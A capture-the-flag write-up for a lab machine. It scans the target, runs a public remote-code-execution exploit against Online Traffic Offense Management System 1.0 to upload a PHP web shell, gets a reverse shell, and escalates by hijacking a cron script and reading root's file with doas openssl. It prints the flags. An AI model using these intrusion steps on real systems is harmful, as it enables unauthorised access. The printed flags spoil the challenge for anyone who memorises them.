# User.txt


- Found 3 ports open on the system

```shell
❯ rustscan -a 10.10.252.238 --ulimit 5000 -- -sC -sV  | tee rustscan.log   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.252.238:22
Open 10.10.252.238:80
Open 10.10.252.238:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-05 20:09 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:09
Completed NSE at 20:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:09
Completed NSE at 20:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:09
Completed NSE at 20:09, 0.00s elapsed
Initiating Ping Scan at 20:09
Scanning 10.10.252.238 [2 ports]
Completed Ping Scan at 20:09, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:09
Completed Parallel DNS resolution of 1 host. at 20:09, 5.50s elapsed
DNS resolution of 1 IPs took 5.50s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 20:09
Scanning 10.10.252.238 [3 ports]
Discovered open port 22/tcp on 10.10.252.238
Discovered open port 80/tcp on 10.10.252.238
Discovered open port 445/tcp on 10.10.252.238
Completed Connect Scan at 20:09, 0.16s elapsed (3 total ports)
Initiating Service scan at 20:09
Scanning 3 services on 10.10.252.238
Completed Service scan at 20:09, 16.68s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.252.238.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:09
NSE Timing: About 99.76% done; ETC: 20:10 (0:00:00 remaining)
Completed NSE at 20:10, 34.44s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Nmap scan report for 10.10.252.238
Host is up, received syn-ack (0.16s latency).
Scanned at 2023-03-05 20:09:23 IST for 52s

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSk+lD9baengtZg1zPPR4SVHS2JWnI2fkH90VgBhh7iRQKND35/SOP13L/a3oDA3qub2FgT1ejvHA3D7wcY5ZCgq17mLXCw6WW0IDRWbH7kyPUBolc9h6ZI+Zpiyr7sUitywYRW5WCrEHpUs6ol92pR46UnXfwmsuvY6RVWaviUT95xmUZPgVUpw8PJjDU3TJpCYEtnW6AoEO0/7OSx7LkbrvMCnIitZi2mcBvfc/WbCmvtiOLsKBwh21VCXUhLAzVGZ5xOdD4rAcD3OACM/gJVGe5wJJJL1Abt/1flGBJyvYZUoz/JQxoa+HpjcRXmSa+nprBxPdvmQDjsf+UPmpegVPME9iNfkmoEWDgN/lWWZnyPC8kBzhxkM8/rQkfmJlK1F9Lq60BoF6ipj6/W1O94yzaFL7+mNRFrV86zgZhbr1l9MQyUcJoDnlCMygYo1HhkYsfGBR1Tu5M031sZpVNIEUSSfXwrlUX4k4ThaCPDsEMB941K/OUbAuhmQo2MGE=
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMLlGKfQy13XGzOkqSgnrB7thrs/Bh+kpzchoHn6PCCBDOZ0j3uFzQWvl5uimdLDXombozAcFHlzDjGL50hKarQ=
|   256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHs4NezobK71HOHpkwVK5b5LS0MgCghx1Oj4eld8ONa1
80/tcp  open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34964/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34343/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 5764/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22407/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:10
Completed NSE at 20:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.62 seconds

```

- Can't access samba server without password and username 

```shell
❯ enum4linux -a -u "" -p "" 10.10.252.238 | tee enum4linux.log      
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar  5 20:10:37 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.252.238
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.252.238 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.10.252.238 )===============================

Looking up status of 10.10.252.238
No reply from 10.10.252.238

 ===================================( Session Check on 10.10.252.238 )===================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```


- Found 3 interesting endpoints `amdin`, `passwd`, and `shadow`. 

```shell
❯ gobuster dir --url http://10.10.252.238 -w /usr/share/wordlists/dirb/common.txt  -x php,js,txt,html  | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.238
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2023/03/05 20:11:05 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.10.252.238/admin/]
/index.html           (Status: 200) [Size: 10918]                                
/index.html           (Status: 200) [Size: 10918]                                
/passwd               (Status: 200) [Size: 25]                                   
/server-status        (Status: 403) [Size: 278]                                  
/shadow               (Status: 200) [Size: 25]                                   
                                                                                 
===============================================================
2023/03/05 20:17:07 Finished
===============================================================

```

- Checked out all these endpoints but the author is just playing around.

```shell
❯ curl http://10.10.252.238/admin/id_rsa | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    81  100    81    0     0    261      0 --:--:-- --:--:-- --:--:--   262
Trust me it is not this easy..now get back to enumeration :D%  

❯ curl http://10.10.252.238/shadow | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    25  100    25    0     0     81      0 --:--:-- --:--:-- --:--:--    81
not this easy :D%  
❯ curl http://10.10.252.238/passwd | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    25  100    25    0     0     80      0 --:--:-- --:--:-- --:--:--    80
not this easy :D%  
```


- Interestingly port `445` is serving as web server, so enumerated it with `gobuster`.
- Found `/management`.

```shell
❯ gobuster dir --url http://10.10.252.238:445 -w /usr/share/wordlists/dirb/common.txt  -x php,js,txt,html  | tee gobuster:445.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.238:445
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2023/03/05 20:10:17 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.js              (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htpasswd.js         (Status: 403) [Size: 279]
/.htaccess.js         (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/management           (Status: 301) [Size: 324] [--> http://10.10.252.238:445/management/]
```

- `/management` is running `Online Traffic Offense Management System 1.0` which is vulnerable to Remote Code Exploitation

```shell
❯ searchsploit "Online Traffic Management System"
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Online Traffic Offense Management System 1.0 - 'id' SQL I | php/webapps/50218.txt
Online Traffic Offense Management System 1.0 - Multiple R | php/webapps/50389.txt
Online Traffic Offense Management System 1.0 - Multiple S | php/webapps/50387.txt
Online Traffic Offense Management System 1.0 - Multiple X | php/webapps/50388.txt
Online Traffic Offense Management System 1.0 - Privilage  | php/webapps/50392.txt
Online Traffic Offense Management System 1.0 - Remote Cod | php/webapps/50221.py
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

- Exploited the system

```shell
❯ python2 50221.py

Example: http://example.com

Url: http://10.10.252.238:445/management/
Check Url ...

[+] Bypass Login

[+] Upload Shell

[+] Exploit Done!

$ ls
Traceback (most recent call last):
  File "50221.py", line 107, in <module>
    request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 119, in post
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/api.py", line 61, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 516, in request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/sessions.py", line 459, in prepare_request
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 314, in prepare
  File "/usr/share/offsec-awae-wheels/requests-2.23.0-py2.py3-none-any.whl/requests/models.py", line 388, in prepare_url
requests.exceptions.MissingSchema: Invalid URL '/management/uploads/1678028700_evil.php?cmd=ls': No schema supplied. Perhaps you meant http:///management/uploads/1678028700_evil.php?cmd=ls?

```

- The exploit fails due to sum syntax error, but it looks like that it has uploaded a file in  `/management/uploads/1678028700_evil.php` 

- Confirmed it 

```shell
❯ curl http://10.10.252.238:445/management/uploads/1678028700_evil.php\?cmd\=ls
<pre>1629334140_traffic_bg.jpg
1629336240_avatar.jpg
1629421080_tl-logo.png
1678028700_evil.php
drivers
</pre>
```

- Got back a shell.

```shell
[20:38:53] Welcome to pwncat 🐈!                                                                                                                                        __main__.py:164
(local) pwncat$ listen -m linux 4444
[20:39:05] new listener created for 0.0.0.0:4444                                                                                                                         manager.py:957
[20:41:31] 10.10.252.238:56888: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                            manager.py:957
[20:41:33] 10.10.252.238:56888: registered new host w/ db                                                                                                                manager.py:957
[20:41:36] listener: 0.0.0.0:4444: linux session from 10.10.252.238:56888 established                                                                                    manager.py:957
(local) pwncat$ sessions
                                       Active Sessions                                        
     ╷          ╷                                  ╷          ╷        ╷                      
  ID │ User     │ Host ID                          │ Platform │ Type   │ Address              
 ════╪══════════╪══════════════════════════════════╪══════════╪════════╪═════════════════════ 
  *0 │ www-data │ ec092f8621af0657e524c850bbb63cc8 │ linux    │ Socket │ 10.10.252.238:56888  
     ╵          ╵                                  ╵          ╵        ╵                      
(local) pwncat$ sessions 0
[20:41:53] targeting session-0 (10.10.252.238:56888)                                                                                                                     sessions.py:88
(local) pwncat$                                                                                                                                                                        
(remote) www-data@plotted:/var/www/html/445/management/uploads$ ls
1629334140_traffic_bg.jpg  1629336240_avatar.jpg  1629421080_tl-logo.png  1678028700_evil.php  drivers
(remote) www-data@plotted:/var/www/html/445/management/uploads$ 
```


- Found `/var/www/scripts/backup.sh` running as `cronjob` every one minute

```shell
(remote) www-data@plotted:/var/www/scripts$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * *	plot_admin /var/www/scripts/backup.sh
#
```

- We have write rights in `/var/www/scripts`.

```shell
(remote) www-data@plotted:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Oct 28  2021 .
drwxr-xr-x 14 root     root     4096 Oct 28  2021 ..
drwxr-xr-x  4 root     root     4096 Oct 28  2021 html
drwxr-xr-x  2 www-data www-data 4096 Mar  5 15:25 scripts
```

- Move your own `backup.sh` with reverse shell payload 

- Waited for 1 minute and got backup a shell as `plot-admin`.

```shell
(remote) plot_admin@plotted:/home/plot_admin$ ls
tms_backup  user.txt
(remote) plot_admin@plotted:/home/plot_admin$ cat user.txt 
77927510d5edacea1f9e86602f1fbadb
```

# What is root.txt?

- Found `doas` 

```shell
(remote) plot_admin@plotted:/home/plot_admin$ find / -perm -u=s -type f 2>/dev/null
/snap/core18/2284/bin/mount
/snap/core18/2284/bin/ping
/snap/core18/2284/bin/su
/snap/core18/2284/bin/umount
/snap/core18/2284/usr/bin/chfn
/snap/core18/2284/usr/bin/chsh
/snap/core18/2284/usr/bin/gpasswd
/snap/core18/2284/usr/bin/newgrp
/snap/core18/2284/usr/bin/passwd
/snap/core18/2284/usr/bin/sudo
/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2284/usr/lib/openssh/ssh-keysign
/snap/core18/2246/bin/mount
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount
/snap/core18/2246/usr/bin/chfn
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp
/snap/core18/2246/usr/bin/passwd
/snap/core18/2246/usr/bin/sudo
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/snapd/14549/usr/lib/snapd/snap-confine
/snap/snapd/13640/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chsh
/usr/bin/umount
/usr/bin/doas
/usr/bin/newgrp
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

- Found `openssl` in `/etc/doas.conf` running as root.

```shell
(remote) plot_admin@plotted:/home/plot_admin$ cat /etc/doas.conf 
permit nopass plot_admin as root cmd openssl
```

- Checked out `openssl` on `gtfobins`

- Tried reading `/root/root.txt` and voila got root flag.

```shell
(remote) plot_admin@plotted:/home/plot_admin$ doas openssl enc -in /root/root.txt
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```


